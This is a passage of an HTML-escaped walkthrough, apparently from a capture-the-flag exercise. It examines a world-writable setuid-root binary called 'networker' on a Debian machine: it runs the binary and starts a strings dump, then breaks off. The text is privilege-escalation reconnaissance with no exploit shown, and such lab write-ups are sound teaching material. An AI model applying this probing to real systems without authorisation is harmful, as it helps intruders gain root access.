&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rwsrwxrwx&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;root&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;7496&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;juin&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;00&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;networker&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;rw&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;jimmy&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;jimmy&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;675&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;juin&lt;/span&gt;&lt;span class="w"&gt;   &lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;21&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;profile&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;drwxr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;xr&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;jimmy&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;jimmy&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;4096&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nov&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="mi"&gt;17&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;31&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ssh&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;It seems to give information about the network configuration, ping localhost and and echo "echo linux tool version 5":&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;jimmy&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;debian&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;./&lt;/span&gt;&lt;span class="n"&gt;networker&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;***&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Networker&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;2.0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;***&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;eth0&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="n"&gt;Link&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;encap&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;Ethernet&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;HWaddr&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;08&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;00&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;84&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;43&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;c4&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;inet&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;adr&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mf"&gt;10.0&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;2.5&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;Bcast&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mf"&gt;10.0&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;2.255&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;Masque&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mf"&gt;255.255&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;255.0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;adr&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;inet6&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;fe80&lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="n"&gt;a00&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt;&lt;span class="n"&gt;ff&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;fe84&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;43&lt;/span&gt;&lt;span class="n"&gt;c4&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Scope&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;Lien&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;UP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;BROADCAST&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;RUNNING&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;MULTICAST&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;MTU&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1500&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;Metric&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;RX&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;packets&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;3934&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;errors&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dropped&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;overruns&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;frame&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;TX&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;packets&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;2705&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;errors&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dropped&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;overruns&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;carrier&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;collisions&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lg&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;transmission&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;RX&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;331724&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;323.9&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;KiB&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;TX&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;398743&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;389.3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;KiB&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;Interruption&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;9&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Adresse&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;de&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;base&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mh"&gt;0xd020&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;lo&lt;/span&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="n"&gt;Link&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;encap&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;Boucle&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;locale&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;inet&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;adr&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mf"&gt;127.0&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;0.1&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;Masque&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mf"&gt;255.0&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;0.0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;adr&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;inet6&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;::&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;128&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Scope&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;Hôte&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;UP&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;LOOPBACK&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;RUNNING&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;MTU&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;65536&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;Metric&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;RX&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;packets&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;errors&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dropped&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;overruns&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;frame&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;TX&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;packets&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;6&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;errors&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dropped&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;overruns&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;carrier&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;collisions&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;lg&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;file&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;transmission&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;RX&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;504&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;504.0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="n"&gt;TX&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;504&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;504.0&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;PING&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;localhost&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;127.0&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;0.1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;56&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;84&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;of&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;bytes&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;from&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;localhost&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;127.0&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;0.1&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;icmp_seq&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ttl&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;64&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mf"&gt;0.012&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ms&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;---&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;localhost&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ping&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;statistics&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;---&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;packets&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;transmitted&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;received&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;packet&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;loss&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;ms&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;rtt&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;min&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;avg&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nb"&gt;max&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;mdev&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mf"&gt;0.012&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;0.012&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;0.012&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mf"&gt;0.000&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ms&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Done&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;echo&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;linux&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;tool&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;version&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Vous&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;avez&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;du&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;nouveau&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;courrier&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dans&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;mail&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;jimmy&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Getting the strings in the program give us the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;jimmy&lt;/span&gt;&lt;span class="err"&gt;@&lt;/span&gt;&lt;span class="n"&gt;debian&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;~$&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;strings&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;networker&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;SNIP&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
